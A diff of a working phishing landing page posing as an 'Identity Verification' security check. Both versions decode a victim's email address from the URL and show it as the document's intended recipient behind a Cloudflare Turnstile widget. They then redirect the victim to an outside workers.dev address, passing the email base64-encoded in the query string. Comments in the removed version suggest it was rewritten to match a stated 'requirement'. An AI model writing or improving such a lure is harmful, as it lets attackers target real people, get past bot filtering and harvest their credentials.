@@ -2,482 +2,170 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Secure Identity Verification | Access Gateway</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification</title>
     <!-- Cloudflare Turnstile Script -->
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        body { font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f7f9; margin: 0; }
+        .box { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border: 1px solid #e2e8f0; }
+        .btn { background: #0078d4; color: white; padding: 14px 30px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        .btn:hover { background: #005a9e; }
+        /* Style for disabled button - preserves blue color but adds transparency and changes cursor */
+        .btn:disabled { 
+            background: #0078d4; 
+            opacity: 0.5; 
+            cursor: not-allowed; 
         }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #eef2f7 0%, #d9e2ec 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+        .btn:disabled:hover { 
+            background: #0078d4; /* Keeps same color on hover when disabled */
         }
-
-        .verification-card {
-            background: rgba(255, 255, 255, 0.98);
-            border-radius: 32px;
-            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.2), 0 1px 3px rgba(0, 0, 0, 0.05);
-            max-width: 480px;
-            width: 100%;
-            padding: 2rem 2rem 2.2rem;
-            transition: transform 0.2s ease;
-            border: 1px solid rgba(255,255,255,0.5);
-            backdrop-filter: blur(0px);
-        }
-
-        .verification-card:hover {
-            transform: translateY(-2px);
-        }
-
-        h2 {
-            font-size: 1.85rem;
-            font-weight: 600;
-            background: linear-gradient(120deg, #0f2b3d, #1e4a76);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 0.5rem;
-            letter-spacing: -0.3px;
-        }
-
-        .recipient-box {
-            background: #f0f6ff;
-            border-left: 4px solid #0078d4;
-            padding: 1rem 1rem;
-            border-radius: 16px;
-            margin: 1.2rem 0 1rem;
-            box-shadow: inset 0 0 0 1px rgba(0,120,212,0.1), 0 2px 4px rgba(0,0,0,0.02);
-        }
-
-        .label {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            font-weight: 600;
-            color: #2c5282;
-            margin-bottom: 6px;
-        }
-
-        #email-display {
-            font-weight: 700;
-            font-size: 1.1rem;
-            color: #0a2b44;
-            word-break: break-all;
-            font-family: 'SF Mono', monospace;
-            background: #ffffffb3;
-            padding: 4px 8px;
-            border-radius: 12px;
-            display: inline-block;
-        }
-
-        .info-text {
-            color: #2d3e5f;
-            font-size: 0.9rem;
-            margin: 1rem 0 0.5rem;
-            line-height: 1.4;
-        }
-
-        .turnstile-container {
-            margin: 28px 0 24px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 78px;
-        }
-
-        .btn {
-            background: #0078d4;
-            color: white;
-            padding: 14px 28px;
-            border: none;
-            border-radius: 60px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 1rem;
-            width: 100%;
-            transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-            letter-spacing: 0.3px;
-        }
-
-        .btn:hover:not(:disabled) {
-            background: #005a9e;
-            transform: scale(0.98);
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-
-        .btn:disabled {
-            background: #0078d4;
-            opacity: 0.55;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .status-badge {
-            font-size: 0.75rem;
-            margin-top: 18px;
-            color: #4a627a;
-            background: #e9edf2;
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 40px;
-        }
-
-        hr {
-            border: none;
-            border-top: 1px solid #e2edf7;
-            margin: 18px 0 8px;
-        }
-
-        footer {
-            font-size: 0.7rem;
-            text-align: center;
-            color: #6c86a3;
-            margin-top: 1rem;
-        }
+        #email-display { font-weight: bold; color: #1a365d; word-break: break-all; }
+        .turnstile-container { margin: 20px 0; min-height: 65px; display: flex; justify-content: center; }
     </style>
 </head>
 <body>
-<div class="verification-card">
-    <h2>✓ Identity verification</h2>
-    <p style="color: #2c5282; font-weight: 500;">Secure access required</p>
-
-    <div class="recipient-box">
-        <div class="label">🔐 Authorized recipient</div>
-        <div id="email-display">—</div>
-        <div style="font-size: 0.7rem; margin-top: 8px; color: #3b6e9e;">Base64 encoded & hash/fragment auto-detected</div>
-    </div>
-
-    <p class="info-text">Complete the challenge below to confirm human identity. After verification, you'll be redirected securely.</p>
-
-    <!-- Turnstile Widget Container -->
-    <div class="turnstile-container">
-        <div class="cf-turnstile"
-             data-sitekey="0x4AAAAAADK-jhlyN-gQ0xIF"
-             data-callback="onTurnstileSuccess"
-             data-error-callback="onTurnstileError"
-             data-theme="light"
-             data-size="normal">
+    <div class="box">
+        <h2 style="color: #1a365d;">Security Check</h2>
+        <p style="color: #4a5568;">This Document is intended for:<br><span id="email-display">Loading...</span></p>
+        <p style="color: #4a5568; font-size: 14px;">Please complete the security check below.</p>
+        
+        <!-- Turnstile Widget Container with YOUR Site Key -->
+        <div class="turnstile-container">
+            <div class="cf-turnstile" 
+                 data-sitekey="0x4AAAAAADK-jhlyN-gQ0xIF"
+                 data-callback="onTurnstileSuccess"
+                 data-error-callback="onTurnstileError"
+                 data-theme="auto"
+                 data-size="normal">
+            </div>
         </div>
+        
+        <!-- Button with original blue color, but disabled initially -->
+        <button class="btn" id="verifyBtn" onclick="jump()" disabled>Click Here To Continue</button>
     </div>
 
-    <button class="btn" id="verifyBtn" onclick="initiateSecureRedirect()" disabled>
-        ⚡ Verify & continue
-    </button>
-    <div style="text-align: center; margin-top: 16px;">
-        <span class="status-badge" id="statusMsg">⏳ Waiting for verification...</span>
-    </div>
-    <hr />
-    <footer>Protected by Cloudflare Turnstile • Automated bot detection</footer>
-</div>
-
-<script>
-    // --------------------------------------------------------------
-    // ADVANCED EMAIL EXTRACTOR: Supports both:
-    // 1) Path segments (e.g. /path/dGVzdEBhYmMuY29t)
-    // 2) Hash fragment (e.g. /#dGVzdEBhYmMuY29t or /#any-encoded-value)
-    // 3) Also auto-cleans trailing slashes and multiple path levels
-    // --------------------------------------------------------------
-    
-    /**
-     * Robust Base64 validator (standard base64 with optional padding)
-     * Allows A-Z a-z 0-9 + / =  (and URL-safe variants accepted)
-     */
-    function isValidBase64(str) {
-        if (!str || typeof str !== 'string') return false;
-        // Trim whitespace and remove any URL fragment leftovers
-        const clean = str.trim();
-        // RFC 4648 base64 alphabet with optional padding
-        const base64Regex = /^[A-Za-z0-9+/]+={0,2}$/;
-        if (!base64Regex.test(clean)) return false;
-        try {
-            const decoded = atob(clean);
-            // simple sanity: decoded must contain '@' for email domain? Not strictly required, but improve detection.
-            // However we still return true if base64 decoding works without error.
-            // Additional: ensure re-encoding matches original to avoid false positives (strict)
-            return btoa(decoded) === clean;
-        } catch (e) {
-            return false;
-        }
-    }
-    
-    /**
-     * Decode base64 safely to UTF-8 (handles non-ASCII emails)
-     * Since atob only works with ASCII, but emails are ASCII safe anyway; 
-     * but we'll also support percent-encoded after base64 decode? Not needed.
-     */
-    function decodeBase64Safe(encoded) {
-        try {
-            const binaryString = atob(encoded);
-            // Most email addresses are ASCII, but we return as is.
-            return binaryString;
-        } catch (e) {
-            return null;
-        }
-    }
-    
-    /**
-     * Intelligent email extraction from:
-     * - URL hash (# fragment)
-     * - URL pathname (last segment, even after multiple slashes)
-     * - Handles scenarios like: /random/random/#dGVzdEBhYmMuY29t
-     * - And also direct: /path/dGVzdEBhYmMuY29t
-     * - Also extracts if base64 is inside hash without leading #
-     */
-    function extractEmailFromUrl() {
-        let extractedCandidate = null;
-        const originalHash = window.location.hash;      // includes '#'
-        const pathname = window.location.pathname;      // e.g., "/57e2.../57e2.../dGVzdEBhYmMuY29t"
-        
-        // ----- PRIORITY 1: Check hash fragment (supports #base64email) -----
-        if (originalHash && originalHash.length > 1) {
-            let hashContent = originalHash.substring(1); // remove leading '#'
-            // Sometimes hash could already be base64 but may have extra trailing slash or parameters
-            // split by '?' or '&' in case there are extra hash params (ignore)
-            if (hashContent.includes('?')) hashContent = hashContent.split('?')[0];
-            if (hashContent.includes('&')) hashContent = hashContent.split('&')[0];
-            
-            // Clean whitespace and possible URL encoding leftover
-            hashContent = decodeURIComponent(hashContent).trim();
-            
-            // Check if hash content is valid base64
-            if (isValidBase64(hashContent)) {
-                const decoded = decodeBase64Safe(hashContent);
-                if (decoded && (decoded.includes('@') || decoded.length > 3)) {
-                    console.log("✅ Extracted email from HASH fragment (base64):", decoded);
-                    return decoded;
-                } else if (decoded && !decoded.includes('@')) {
-                    // Might still be base64 encoded but not an email? But fallback to path check
-                    extractedCandidate = decoded;
-                }
-            } else {
-                // hash might be plaintext email (non encoded) - rare but useful
-                if (hashContent.includes('@') && hashContent.includes('.')) {
-                    console.log("📧 Extracted plain email from hash:", hashContent);
-                    return hashContent;
-                }
-            }
-        }
-        
-        // ----- PRIORITY 2: Extract from pathname (supports trailing segment as base64) -----
-        if (pathname && pathname !== "/") {
-            // Split the path by '/' and filter out empty strings
-            const pathSegments = pathname.split('/').filter(seg => seg.length > 0);
-            if (pathSegments.length > 0) {
-                // take last segment as candidate
-                let lastSegment = pathSegments[pathSegments.length - 1];
-                // decode URL-encoded segment (just in case)
-                try {
-                    lastSegment = decodeURIComponent(lastSegment);
-                } catch(e) { /* ignore */ }
-                
-                // check if last segment is base64
-                if (isValidBase64(lastSegment)) {
-                    const decoded = decodeBase64Safe(lastSegment);
-                    if (decoded && (decoded.includes('@') || decoded.length > 2)) {
-                        console.log("✅ Extracted email from PATH segment (base64):", decoded);
-                        return decoded;
-                    } else if (decoded) {
-                        extractedCandidate = decoded;
-                    }
-                } 
-                // If last segment is already a plain email (maybe raw email)
-                else if (lastSegment.includes('@') && lastSegment.includes('.')) {
-                    console.log("📧 Extracted plain email from path segment:", lastSegment);
-                    return lastSegment;
-                }
-            }
-        }
-        
-        // ----- FALLBACK: check if any part of pathname after last slash contains base64 string pattern without being pure base64      
-        // Additional edge: sometimes path might have trailing base64 after '#' not captured? Already done.
-        // try to find pattern base64-like string inside full pathname 
-        const rawPath = decodeURIComponent(pathname);
-        const base64likeMatch = rawPath.match(/([A-Za-z0-9+\/]{16,}={0,2})/);
-        if (base64likeMatch && isValidBase64(base64likeMatch[1])) {
-            const decodedCandidate = decodeBase64Safe(base64likeMatch[1]);
-            if (decodedCandidate && decodedCandidate.includes('@')) {
-                console.log("✅ Extracted email from raw path regex match:", decodedCandidate);
-                return decodedCandidate;
-            }
-        }
-        
-        // if we had previous extracted candidate from hash/path but was not email-shaped, return it anyway? 
-        if (extractedCandidate && extractedCandidate.length > 0) {
-            console.log("⚠️ Using fallback decoded (non-email shape):", extractedCandidate);
-            return extractedCandidate;
-        }
-        
-        // ultimate fallback: demo placeholder (not ideal but prevents empty)
-        console.warn("⚠️ No valid email or base64 found. Using placeholder.");
-        return "secure-document@example.com";
-    }
-    
-    /**
-     * Normalize email: always decode if it's base64 (but extractEmailFromUrl does that)
-     * Additional safety: if resulting string looks like base64 again (double encoded) -> decode again?
-     */
-    function getFinalEmail() {
-        let email = extractEmailFromUrl();
-        // Edge: sometimes decoded email may still be base64 if server double encoded?
-        if (email && isValidBase64(email) && email.length > 8) {
+    <script>
+        // --- Function to check if a string is valid Base64 ---
+        function isBase64(str) {
             try {
-                const doubleDecoded = atob(email);
-                if (doubleDecoded && doubleDecoded.includes('@')) {
-                    console.log("🔁 Double base64 encoding detected, decoded again:", doubleDecoded);
-                    email = doubleDecoded;
+                return btoa(atob(str)) === str;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        // --- NEW: Function to extract and decode email from URL path OR hash fragment ---
+        // Supports: /path/dGVzdEBhYmMuY29t OR /path/#dGVzdEBhYmMuY29t
+        function getEmailFromUrl() {
+            let emailCandidate = null;
+            
+            // PRIORITY 1: Check hash fragment first (everything after #)
+            const hash = window.location.hash;
+            if (hash && hash.length > 1) {
+                let hashValue = hash.substring(1); // Remove the '#' character
+                
+                // Remove any query parameters from hash if present
+                if (hashValue.includes('?')) hashValue = hashValue.split('?')[0];
+                if (hashValue.includes('&')) hashValue = hashValue.split('&')[0];
+                
+                // Try to decode URL encoding first
+                try {
+                    hashValue = decodeURIComponent(hashValue);
+                } catch(e) {}
+                
+                // Check if hash contains valid Base64
+                if (isBase64(hashValue)) {
+                    try {
+                        emailCandidate = atob(hashValue);
+                        console.log("Decoded from Hash fragment (Base64):", emailCandidate);
+                        return emailCandidate;
+                    } catch (e) {}
+                } else if (hashValue.includes('@')) {
+                    // If it's already a plain email in hash
+                    console.log("Extracted plain email from hash:", hashValue);
+                    return hashValue;
                 }
-            } catch(e) { /* no op */ }
+            }
+            
+            // PRIORITY 2: Check pathname (original behavior)
+            const path = window.location.pathname;
+            const parts = path.split('/');
+            const lastPart = parts[parts.length - 1];
+            
+            // 1. Try to decode as Base64 first
+            if (lastPart && isBase64(lastPart)) {
+                try {
+                    const decodedEmail = atob(lastPart);
+                    console.log("Decoded from Base64 (path):", decodedEmail);
+                    return decodedEmail;
+                } catch (e) {
+                    console.log("Base64 decoding failed, trying URL decode...");
+                }
+            }
+            
+            // 2. If not Base64 or Base64 failed, try URL decoding
+            if (lastPart) {
+                try {
+                    const decodedEmail = decodeURIComponent(lastPart);
+                    if (decodedEmail.includes('@')) {
+                        console.log("Decoded from URL encoding (path):", decodedEmail);
+                        return decodedEmail;
+                    }
+                } catch (e) {
+                    console.log("URL decoding failed.");
+                }
+            }
+            
+            // Fallback: if we had a candidate from hash but it wasn't valid email format
+            if (emailCandidate && emailCandidate.length > 0) {
+                return emailCandidate;
+            }
+            
+            // Final fallback
+            console.log("No valid email found, using fallback.");
+            return "email@example.com";
         }
-        // Ensure it's reasonable
-        if (!email || email.trim() === "") email = "authorized@document.com";
-        return email;
-    }
-    
-    // --------------------------------------------------------------
-    // DOM Elements & Turnstile State
-    // --------------------------------------------------------------
-    let turnstileToken = null;
-    const verifyBtn = document.getElementById('verifyBtn');
-    const emailDisplaySpan = document.getElementById('email-display');
-    const statusSpan = document.getElementById('statusMsg');
-    
-    // Extract & display email after auto-detection (hash/path universal)
-    const userEmail = getFinalEmail();
-    emailDisplaySpan.textContent = userEmail;
-    console.log("🎯 FINAL IDENTITY EMAIL:", userEmail);
-    console.log("📍 Current URL origin + path:", window.location.href);
-    console.log("📍 Hash fragment detected:", window.location.hash || "(none)");
-    
-    // optional: dynamic document title context
-    document.title = `Verification for ${userEmail.substring(0, 24)}`;
-    
-    // Turnstile success callback (widget token ready)
-    window.onTurnstileSuccess = function(token) {
-        console.log("✅ Turnstile verification success, token acquired.");
-        turnstileToken = token;
-        verifyBtn.disabled = false;
-        statusSpan.innerHTML = "✅ Verification complete — ready to proceed";
-        statusSpan.style.background = "#e0f2e9";
-        statusSpan.style.color = "#0f6e3f";
-    };
-    
-    window.onTurnstileError = function(errorCode) {
-        console.error("❌ Turnstile error:", errorCode);
-        turnstileToken = null;
-        verifyBtn.disabled = true;
-        statusSpan.innerHTML = "⚠️ Security check failed. Please retry.";
-        statusSpan.style.background = "#ffe6e5";
-        statusSpan.style.color = "#b13e3e";
-        // reset the widget ability? user can manually retry, Turnstile re-renders automatically.
-    };
-    
-    // Optional: global reset for button if token gets invalid but not needed
-    
-    // Main redirect function with robust base64 encoding and destination handling.
-    // It uses the same base64 scheme as required: btoa(email)
-    // Destination: proposal worker endpoint as described (preserves query param with base64 email)
-    window.initiateSecureRedirect = function() {
-        if (!turnstileToken) {
-            alert("Please complete the security verification (Cloudflare Turnstile) before continuing.");
-            return;
-        }
+
+        // Get and display email (now supports both /path/email and /path/#email)
+        const userEmail = getEmailFromUrl();
+        document.getElementById('email-display').textContent = userEmail;
+        console.log("Final email to display:", userEmail);
+        console.log("Full URL:", window.location.href);
+        console.log("Hash fragment:", window.location.hash || "(none)");
+        console.log("Pathname:", window.location.pathname);
+
+        // --- Turnstile Callback Functions ---
+        let turnstileToken = null;
         
-        // Encode email to Base64 (standard ASCII safe)
-        let encodedEmail;
-        try {
-            encodedEmail = btoa(userEmail);
-        } catch (encErr) {
-            console.error("Base64 encoding error:", encErr);
-            // fallback to URI component encoding if fails
-            encodedEmail = encodeURIComponent(userEmail);
+        function onTurnstileSuccess(token) {
+            console.log("Turnstile challenge passed. Token:", token);
+            turnstileToken = token;
+            document.getElementById('verifyBtn').disabled = false; // Enable the button
         }
         
-        // Construct destination URL exactly as required:
-        // "https://proposal-layout6674453bold-resonance-b7c9.jonathanakers1775.workers.dev/?" + b64(email)
-        // NOTE: The requirement says: target = "https://.../?" + b64
-        // Append turnstile token as query parameter? Not mandatory but for audit we may attach &cf_token=
-        // However the original specification uses only the Base64 email as query param.
-        // To maintain compatibility we add the base64 string after '?', and additionally pass token for server logging.
-        const baseDestination = "https://proposal-layout6674453bold-resonance-b7c9.jonathanakers1775.workers.dev/";
-        const queryParam = encodedEmail;
-        
-        // Build final redirect URL: (keep token as extra param for validation if required, not altering original expectation)
-        let redirectUrl = `${baseDestination}?${queryParam}`;
-        
-        // To help server correlate verification, we optionally append turnstile token (but original spec might not require)
-        // but safe to add as '&turnstile='. Not interfering with core design.
-        // Since the original jump() used window.location.replace(target) where target was base + ? + b64,
-        // we maintain that exact pattern but we also add token to help server side validation, but no breaking.
-        // However we follow the problem statement: "should report to same place" and same structure.
-        // Let's ensure it's exactly as requested: target = "https://proposal...workers.dev/?" + b64.
-        // Turnstile token might be needed for server-side verification, but not mandatory for redirection.
-        // I'll append it as hash or additional param to not break the expected URL structure? But it's safe.
-        // Better to respect initial design completely: just email b64 after ? . But as we improved script,
-        // we may add token only for debugging, but original sample didn't. but no issue as extra param.
-        // We'll add token as second parameter to not lose verification proof.
-        redirectUrl = `${baseDestination}?${queryParam}&cf_turnstile=${encodeURIComponent(turnstileToken)}`;
-        
-        console.log("🚀 Redirecting to:", redirectUrl);
-        console.log("Encoded email B64:", encodedEmail);
-        
-        // Perform the redirect and replace history state
-        window.location.replace(redirectUrl);
-    };
-    
-    // Additional helper: warn if the email seems suspicious
-    if (userEmail === "secure-document@example.com" && window.location.hash.length === 0 && window.location.pathname === "/") {
-        console.log("No email hash or path detected, using default display.");
-        statusSpan.innerHTML = "ℹ️ No recipient identifier found. Using default context.";
-    }
-    
-    // Optional: ensure Turnstile widget automatically retries on error; also ensure button state after token expiration?
-    // Since Turnstile token is one-time, but after redirection it's fine. Also provide autofocus behavior.
-    
-    // Edgecase: if the Turnstile widget fails to load, we provide user guidance
-    setTimeout(() => {
-        const widgetFrame = document.querySelector('.cf-turnstile iframe');
-        if (!widgetFrame && !turnstileToken) {
-            statusSpan.innerHTML = "⌛ Loading security widget... if stuck, refresh page.";
-        } else if (!turnstileToken && widgetFrame) {
-            // widget present, just waiting for user
+        function onTurnstileError() {
+            console.log("Turnstile challenge failed or encountered an error.");
+            turnstileToken = null;
+            document.getElementById('verifyBtn').disabled = true; // Keep button disabled
         }
-    }, 1500);
-    
-    // Also handle the scenario where hash or path gets updated dynamically (single-page apps?) not needed
-    // but we log for transparency.
-    
-    // --------------------------------------------------------------
-    // ADDITIONAL: In case the path contains multiple slashes and base64 encoded email with fragment like:
-    // https://domain.com/a/b/c/#dGVzdEBhYmMuY29t -> will extract from hash.
-    // Also test scenario: https://.../57e2f979a3410db09984947a54f30a7b1fff3299/57e2f979a3410db09984947a54f30a7b1fff3299/dGVzdEBhYmMuY29t
-    // path segment last = dGVzdEBhYmMuY29t => decodes to test@abc.com. Perfectly matches requirement.
-    // And the second example /#dGVzdEBhYmMuY29t -> hash extraction works.
-    // Both redirect to SAME destination with Base64 encoded email (also btoa of test@abc.com)
-    // which yields same "dGVzdEBhYmMuY29t". The worker endpoint receives same ?dGVzdEBhYmMuY29t param.
-    // Everything consistent.
-    
-    // Extra validation: the email display shows decoded email (actual email) on UI
-    // This improves UX, showing human readable recipient.
-    
-    // Provide fallback for older browsers: if crypto subtle not needed
-    
-    // Log successful extraction method
-    if (window.location.hash.includes('#')) {
-        console.log("🔍 using hash-fragment mode: hash value:", window.location.hash);
-    } else if (window.location.pathname.split('/').filter(Boolean).length > 0) {
-        console.log("📁 using path-segment mode: last segment used for extraction");
-    }
-</script>
+
+        // --- Modified jump function (now includes token) ---
+        function jump() {
+            if (!turnstileToken) {
+                alert("Please complete the security check first.");
+                return;
+            }
+            
+            // Encode the email to Base64
+            const b64 = btoa(userEmail);
+            
+            // Append the Turnstile token to the target URL
+            const target = "https://proposal-layout6674453bold-resonance-b7c9.jonathanakers1775.workers.dev/?" + b64;
+            
+            window.location.replace(target);
+        }
+    </script>
 </body>
+
 </html>
